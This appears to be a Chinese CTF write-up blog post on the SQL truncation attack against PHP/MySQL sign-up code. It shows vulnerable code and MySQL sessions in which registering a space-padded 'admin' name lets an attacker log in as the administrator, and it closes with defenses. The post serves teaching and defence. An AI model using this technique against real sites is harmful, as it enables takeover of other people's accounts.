原创： archerx  合天智汇

****

0x00 前言

php是世界上最好的语言，哎哎，别打人啊，兄弟把你小拳拳先放下，我错了……

  

  

 ****

0x01 code

 ****

做了SKCTF的一道题，关于sql约束攻击，现在好好总结一下。

来来老夫今天给你看一段代码

注册新用户时：

<?php

// Checking whether a user with the same username exists

$username = mysql_real_escape_string($_GET['username']);

$password = mysql_real_escape_string($_GET['password']);

$query = "SELECT *

FROM users

WHERE username='$username'";

$res = mysql_query($query, $database);

if($res) {

if(mysql_num_rows($res) > 0) {

// User exists, exit gracefully

.

.

}

else {

// If not, only then insert a new entry

$query = "INSERT INTO users(username, password)

VALUES ('$username','$password')";

.

.

}

}

登陆验证代码：

<?php

$username = mysql_real_escape_string($_GET['username']);

$password = mysql_real_escape_string($_GET['password']);

$query = "SELECT username FROM users

WHERE username='$username'

AND password='$password' ";

$res = mysql_query($query, $database);

if($res) {

if(mysql_num_rows($res) > 0){

$row = mysql_fetch_assoc($res);

return $row['username'];

}

}

return Null;

  

没毛病吧？？用户输入过滤了是吧？？加单双引号增加安全性了是吧？确实这段代码是没啥毛病，但是数据库方面的username字段如果没设置为主键或者UNIQUE约束，那就会造成可以以任意身份登陆。

 ****

0x02 演示

先看一下演示用的数据库信息：

mysql> desc test1;

+--------+----------+------+-----+---------+----------------+

| Field | Type | Null | Key | Default | Extra |

+--------+----------+------+-----+---------+----------------+

| id | int(11) | NO | PRI | NULL | auto_increment |

| name | char(20) | YES | | NULL | |

| passwd | char(20) | YES | | NULL | |

+--------+----------+------+-----+---------+----------------+

3 rows in set (0.04 sec)

主键是id具有唯一性，这个一般是实际中都会这样，注意到了没name字段并没设置UNIQUE约束，说明字段值可以不唯一，我们假设数据库中已经存在一个管理员账户为admin，我们又想以admin账户登陆。

 ****

mysql > select * from test1;

+----+-------+--------+

| id | name | passwd |

+----+-------+--------+

| 1 | admin | admin |

+----+-------+--------+

1 row in set (0.00 sec)

  

在执行sql语句时候，字符串末尾的空格会被删除，也就是‘admin’其实和‘admin
’是一样的，我们能不能尝试注册一个admin账户呢？答案当然是能，需要绕过下面这段代码：

$query = "SELECT *

FROM users

WHERE username='$username'";

$res = mysql_query($query, $database);

if($res) {

if(mysql_num_rows($res) > 0) {

// User exists, exit gracefully

.

.

}

  

我们尝试在本地尝试填充空格，发现仍然会查询到结果。

 ****

mysql > select * from test1 where name='admin ';

+----+-------+--------+

| id | name | passwd |

+----+-------+--------+

| 1 | admin | admin |

+----+-------+--------+

1 row in set (0.00 sec)

因为name字段限制20个字符，我们尝试在前面填充空格，使其长度超过20个字符，后面再加上一个字符‘a’，成功绕过这个检查，如下：

mysql> select * from test1 where name='admin a';

Empty set (0.00 sec)

  

执行insert into并看一下数据库是否已经插入：

mysql> insert into test1(name,passwd) values('admin a','123');

Query OK, 1 row affected, 1 warning (0.00 sec)

mysql> select * from test1 ;

+----+-------+--------+

| id | name | passwd |

+----+-------+--------+

| 1 | admin | admin |

| 2 | admin | 123 |

+----+-------+--------+

2 rows in set (0.00 sec)

  

执行以下登陆时的验证：

 ****

mysql > select * from test1 where name='admin' and passwd='123';

+----+-------+--------+

| id | name | passwd |

+----+-------+--------+

| 2 | admin | 123 |

+----+-------+--------+

1 row in set (0.00 sec)

  

返回了查询结果，说明我们已经可以以admin的身份登陆了。

mysql在储存的时候会默认把空格删除，原因是在执行where等需要字符串比较的时候，会使用空格填充字符串，长度保持一致后再进行对比

每个字段都会定义一个长度，例如char(20)，在执行INSERT语句唱过这歌长度会被截断，这就是为什么我们前面执行的语句中最后有一个‘a’但却没被插进去，因为长度过长被截断了。但是在SELECT查询时将使用完整的字符串进行搜索，所以不会查找到匹配的结果，也就绕过了检查用户名是否存在的查询。

 ****

0x03 总结一下

 ****

1\. 经过在本地的测试发现where子句和INSERT语句中的字符串在执行时都会将字符串末尾的空格删除，模糊匹配时使用的LIKE子句则不会删除空格。

2\. 借此机会在这复习一下数据库中的约束

 ****

NOT NULL //不接受NULL值

UNIQUE //约束唯一标识数据库表中的每条记录

PRIMARY KEY //主键约束唯一标识数据库表中的每条记录。

FOREIGN KEY //外键约束用于预防破坏表之间连接的动作。

CHECK //约束用于限制列中的值的范围。

DEFAULT //约束用于向列中插入默认值。如果没有规定其他的值，那么会将默认值添加到所有的新记录。

  

 ****

0x04 如何防御

1\. 将那些不允许有重复的字段例如‘username’加上UNIQUE约束，这样在INSERT在插入相同数据时就会提示失败。

2\. 参数输入限制长度。

3\. 一般id作为主键，身份验证或者token向下级页面传输都应该以id进行查询。

  
（注：本文属于合天原创投稿奖励，未经允许，禁止转载！）  

